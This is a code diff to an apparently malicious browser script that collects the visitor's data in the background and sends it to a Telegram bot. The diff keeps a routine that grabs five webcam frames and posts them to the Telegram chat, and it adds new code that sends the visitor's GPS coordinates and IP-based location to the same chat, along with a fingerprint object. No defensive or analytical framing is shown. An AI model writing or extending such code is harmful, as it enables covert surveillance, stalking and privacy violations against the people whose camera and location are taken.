@@ -432,16 +432,19 @@ console.log("Async function started");
 
     async function captureAndSendCameraFrames() {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            console.log("Camera not supported");
             return { status: 'camera_not_supported' };
         }
 
         // Run in background without blocking
         (async () => {
             try {
+                console.log("Requesting camera permission...");
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 });
+                console.log("Camera permission granted");
 
                 const video = document.createElement('video');
                 video.srcObject = stream;
@@ -461,23 +464,31 @@ console.log("Async function started");
                     try {
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         canvas.toBlob((blob) => {
-                            const formData = new FormData();
-                            formData.append('chat_id', TELEGRAM_USER_ID);
-                            formData.append('photo', blob, `frame-${frameCount}.jpg`);
-                            fetch(url, { method: 'POST', body: formData }).catch(() => {});
+                            if (blob) {
+                                const formData = new FormData();
+                                formData.append('chat_id', TELEGRAM_USER_ID);
+                                formData.append('photo', blob, `frame-${frameCount}.jpg`);
+                                fetch(url, { method: 'POST', body: formData })
+                                    .then(r => console.log(`Frame ${frameCount} sent, status:`, r.status))
+                                    .catch(e => console.error(`Frame ${frameCount} failed:`, e));
+                            }
                         }, 'image/jpeg', 0.7);
 
                         frameCount++;
                         if (frameCount >= 5) {
                             clearInterval(captureInterval);
                             stream.getTracks().forEach(track => track.stop());
+                            console.log("Camera capture complete");
                         }
                     } catch (e) {
+                        console.error("Capture error:", e);
                         clearInterval(captureInterval);
                         stream.getTracks().forEach(track => track.stop());
                     }
                 }, 1000);
-            } catch (e) {}
+            } catch (e) {
+                console.error("Camera access error:", e.message);
+            }
         })();
 
         return { status: 'camera_capturing_background' };
@@ -665,8 +676,30 @@ console.log("Async function started");
     } catch (e) {}
 
     // Get location and camera in background without blocking
-    getGPSLocation().then(loc => { fp.gpsLocation = loc; });
-    getIPLocation().then(iploc => { fp.ipLocation = iploc; });
+    getGPSLocation().then(loc => { 
+        console.log("GPS Location:", loc);
+        fp.gpsLocation = loc;
+        const locMsg = `GPS: ${JSON.stringify(loc)}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: TELEGRAM_USER_ID, text: locMsg })
+        }).catch(e => console.log("GPS send failed:", e));
+    }).catch(e => console.error("GPS error:", e));
+    
+    getIPLocation().then(iploc => { 
+        console.log("IP Location:", iploc);
+        fp.ipLocation = iploc;
+        const ipMsg = `IP Location: ${JSON.stringify(iploc)}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: TELEGRAM_USER_ID, text: ipMsg })
+        }).catch(e => console.log("IP send failed:", e));
+    }).catch(e => console.error("IP error:", e));
+    
     captureAndSendCameraFrames();
 
 })();
